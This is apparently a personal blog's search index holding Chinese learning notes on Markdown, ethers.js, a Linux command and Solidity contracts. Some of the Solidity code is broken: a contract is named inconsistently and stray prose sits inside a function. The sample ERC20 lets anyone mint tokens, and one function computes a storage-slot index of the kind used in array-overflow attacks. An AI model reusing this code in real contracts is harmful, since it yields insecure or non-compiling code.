<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MarkDown语法</title>
      <link href="/2023/02/25/MarkDown%E8%AF%AD%E6%B3%95/MarkDown/"/>
      <url>/2023/02/25/MarkDown%E8%AF%AD%E6%B3%95/MarkDown/</url>
      
        <content type="html"><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>官网链接<a href="https://markdown.com.cn/basic-syntax/">MarkDown</a><br><img src="./图片.jpg" alt="Alt text"><br><img src="https://smms.app/delete/bvXEK9wCYdaV7Moy84GqeUjplf" alt="屏幕截图_20230119_151325.png"></p>]]></content>
      
      
      <categories>
          
          <category> -MarkDown语法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ether.js</title>
      <link href="/2023/01/28/ether.js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/28/ether.js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//import &#123; ethers &#125; from &quot;ethers&quot;;</span></span><br><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;https://cdn-cors.ethers.io/lib/ethers-5.6.9.esm.min.js&quot;</span>;</span><br><span class="line"><span class="comment">//ethers中有一些内置的rpc(速度慢，只读访问，)</span></span><br><span class="line">  <span class="keyword">const</span> provider = ethers.<span class="title function_">getDefaultProvider</span>();</span><br><span class="line"><span class="comment">//由于和区块链交互不是实时的我们需要用到js的async/await语法糖。每次和链交互的调用需要用到await，再把这些这些用async函数包裹起来，最后再调用这个函数。</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">main</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> balance = <span class="keyword">await</span> provider.<span class="title function_">getBalance</span>(<span class="string">`vitalik.eth`</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`ETH Balance of vitalik: <span class="subst">$&#123;ethers.utils.formatEther(balance)&#125;</span> ETH`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//最后在调用</span></span><br><span class="line">  <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ethers.<span class="property">utils</span>.<span class="title function_">formatEther</span>(balance)<span class="comment">//用于将wei转化为eth</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -ether.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux指令</title>
      <link href="/2023/01/13/Linux%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/01/13/Linux%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown -h now(正常关机)，halt（关闭内存），init 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity知识点总结（四）</title>
      <link href="/2022/12/30/solidity/%EF%BC%88%E5%9B%9B%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/12/30/solidity/%EF%BC%88%E5%9B%9B%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h1><h2 id="通过内联汇编部署合约-懵点"><a href="#通过内联汇编部署合约-懵点" class="headerlink" title="通过内联汇编部署合约(懵点)"></a>通过内联汇编部署合约(懵点)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">contract TextContract1&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _owner)</span>public&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestContract2&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    uint public value=msg.value;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public y;</span><br><span class="line">    constructor(uint _x,uint _y)&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        y=_y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理合约，用来部署合约1和2</span></span><br><span class="line">contract Proxy&#123;</span><br><span class="line">    event <span class="title function_">Deploy</span><span class="params">(address)</span>;</span><br><span class="line">    function <span class="title function_">deploy</span><span class="params">(bytes memory _code)</span>external payable <span class="title function_">returns</span><span class="params">(address addr)</span>&#123;<span class="comment">//隐式返回：returns后面定义了名称，自动返回</span></span><br><span class="line">        <span class="comment">//获得部署合约的地址</span></span><br><span class="line">        assembly&#123;<span class="comment">//内联汇编</span></span><br><span class="line">            <span class="comment">//create(v,p,n)</span></span><br><span class="line">            <span class="comment">//v代表部署合约发送的币的数量  通过callvalue获取</span></span><br><span class="line">            <span class="comment">//p代表内存中机器码开始的位置  通过add(_code,0x20)跳跃</span></span><br><span class="line">            <span class="comment">//n代表机器码内存的大小  通过mload(_code)获取</span></span><br><span class="line">            addr :=create(callvalue(),add(_code,<span class="number">0x20</span>),mload(_code))<span class="comment">//msg.value在这里不行</span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        require(addr!=address(<span class="number">0</span>),<span class="string">&quot;deploy failed&quot;</span>); <span class="comment">//判断是否部署成功</span></span><br><span class="line">        emit <span class="title function_">Deploy</span><span class="params">(addr)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过date来呼叫另一个合约中的函数</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(address _target,bytes memory _date)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success, )=_target.call&#123;value:msg.value&#125;(_date);</span><br><span class="line">        require(success,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//助手合约，用来得到合约1和2或者合约中函数的code</span></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    <span class="comment">//获取呼叫合约1的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract1).creationCode;<span class="comment">//特定方法type(合约名称).creationCode</span></span><br><span class="line">        <span class="keyword">return</span> bytecode;</span><br><span class="line">        没有构造函数时用此方法获得bytecode;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约2的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode2</span><span class="params">(uint _x,uint _y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract2).creationCode;<span class="comment">//特定方法</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_x,_y)); <span class="comment">//通过将传入的参数与bytecode打包生成新的bytecode</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约1中setOwner的所需要的date</span></span><br><span class="line">    function <span class="title function_">getCalldate</span><span class="params">(address _owner)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;<span class="comment">//_owner为传入合约1中函数的参数</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodeWithSignature(<span class="string">&quot;setOwner(address)&quot;</span>,_owner);<span class="comment">//特定方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用create2来构造函数（可提前预测生成的地址）"><a href="#用create2来构造函数（可提前预测生成的地址）" class="headerlink" title="用create2来构造函数（可提前预测生成的地址）"></a>用create2来构造函数（可提前预测生成的地址）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract DeployWithCreate2&#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor(address _owner)&#123;</span><br><span class="line">    owner=_owner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Create2Factory&#123;</span><br><span class="line">  event <span class="title function_">Deploy</span><span class="params">(address addr)</span>;</span><br><span class="line">  function <span class="title function_">deploy</span><span class="params">(uint _salt)</span>external&#123;</span><br><span class="line">    DeployWithCreate2 _contract=new DeployWithCreate2&#123;</span><br><span class="line">      salt:bytes32(_salt)</span><br><span class="line">    &#125;(msg.sender);<span class="comment">//create2方法相对于原来的方法只需加个大括号</span></span><br><span class="line">    emit <span class="title function_">Deploy</span><span class="params">(address(_contract))</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算合约地址的方法</span></span><br><span class="line">  function <span class="title function_">getAddress</span><span class="params">(bytes memory bytecode,uint _salt)</span>public view <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 hash=keccak256(abi.encodePacked(</span><br><span class="line">      bytes1(<span class="number">0xff</span>),address(this),_salt,keccak256(bytecode)</span><br><span class="line">    ));</span><br><span class="line">    <span class="keyword">return</span> address(uint160(uint(hash)));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//计算bytecode</span></span><br><span class="line">  function <span class="title function_">getBytecode</span><span class="params">(address _owner)</span>public pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    bytes memory bytecode=type(DeployWithCreate2).creationCode;</span><br><span class="line">    <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寻找slot"><a href="#寻找slot" class="headerlink" title="寻找slot"></a>寻找slot</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract A&#123;</span><br><span class="line">    bytes32 public a;</span><br><span class="line">    bytes32 public b;</span><br><span class="line">    bytes32 public c;</span><br><span class="line">    uint public n;</span><br><span class="line">    uint public g=<span class="number">100</span> ether;</span><br><span class="line">    uint public f=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//keccak256(bytes32(1))!=keccak256(abi.encodePacked(bytes32(1)))</span></span><br><span class="line">    function <span class="title function_">Mapping</span><span class="params">(address _salt,uint num)</span>external <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;<span class="comment">//_salt=1</span></span><br><span class="line">        a=keccak256(abi.encodePacked(bytes32(uint(uint160(_salt))),bytes32(num)));</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">UInt</span><span class="params">(uint num)</span>external <span class="title function_">returns</span><span class="params">(bytes32 )</span>&#123;</span><br><span class="line">        b=keccak256(abi.encodePacked(bytes32(num)));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">     function <span class="title function_">ToBytes</span><span class="params">(uint _a)</span>external <span class="title function_">returns</span><span class="params">(bytes32)</span>&#123;</span><br><span class="line">         c=bytes32(_a);</span><br><span class="line">         <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">find</span><span class="params">()</span>external <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        n=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>-uint(b)+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础合约</title>
      <link href="/2022/12/27/solidity/solidity%E5%9F%BA%E7%A1%80%E5%90%88%E7%BA%A6/"/>
      <url>/2022/12/27/solidity/solidity%E5%9F%BA%E7%A1%80%E5%90%88%E7%BA%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="Ownable"><a href="#Ownable" class="headerlink" title="Ownable"></a>Ownable</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">onlyOwner</span><span class="params">()</span> &#123;  </span><br><span class="line">        require(msg.sender == owner, <span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _; <span class="comment">//函数中其他的代码在</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">////函数中其他的代码在下划线这个位置运行</span></span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _newOwner)</span> external onlyOwner &#123;　　<span class="comment">//切换合约管理员</span></span><br><span class="line">        require(_newOwner != address(<span class="number">0</span>), <span class="string">&quot;invalid address&quot;</span>); <span class="comment">//确认是否是0地址</span></span><br><span class="line">        owner = _newOwner;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.15</span>;</span><br><span class="line"></span><br><span class="line"> interface IERC20 &#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner, address spender)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from, address indexed to, uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner, address indexed spender, uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address=&gt;uint) public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint)) public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name= <span class="string">&quot;Test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint8 public decimals=<span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        allowance[msg.sender][spender]= amount;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[sender][msg.sender] -= amount;</span><br><span class="line">        balanceOf[sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] += amount;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        totalSupply -= amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Address-sol"><a href="#Address-sol" class="headerlink" title="Address.sol"></a>Address.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">library Address &#123;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isContract</span><span class="params">(address account)</span> internal view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">return</span> account.code.length &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">sendValue</span><span class="params">(address payable recipient, uint256 amount)</span> internal &#123;</span><br><span class="line">        require(address(this).balance &gt;= amount, <span class="string">&quot;Address: insufficient balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        (<span class="type">bool</span> success, ) = recipient.call&#123;value: amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        require(success, <span class="string">&quot;Address: unable to send value, recipient may have reverted&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">functionCall</span><span class="params">(address target, bytes memory data)</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionCallWithValue(target, data, <span class="number">0</span>, <span class="string">&quot;Address: low-level call failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    function <span class="title function_">functionCall</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        <span class="built_in">string</span> memory errorMessage</span></span><br><span class="line"><span class="params">    )</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionCallWithValue(target, data, <span class="number">0</span>, errorMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    function <span class="title function_">functionCallWithValue</span><span class="params">(address target, bytes memory data, uint256 value)</span> internal <span class="title function_">returns</span> <span class="params">(bytes memory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> functionCallWithValue(target, data, value, <span class="string">&quot;Address: low-level call with value failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">functionCallWithValue</span><span class="params">(</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes memory data,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        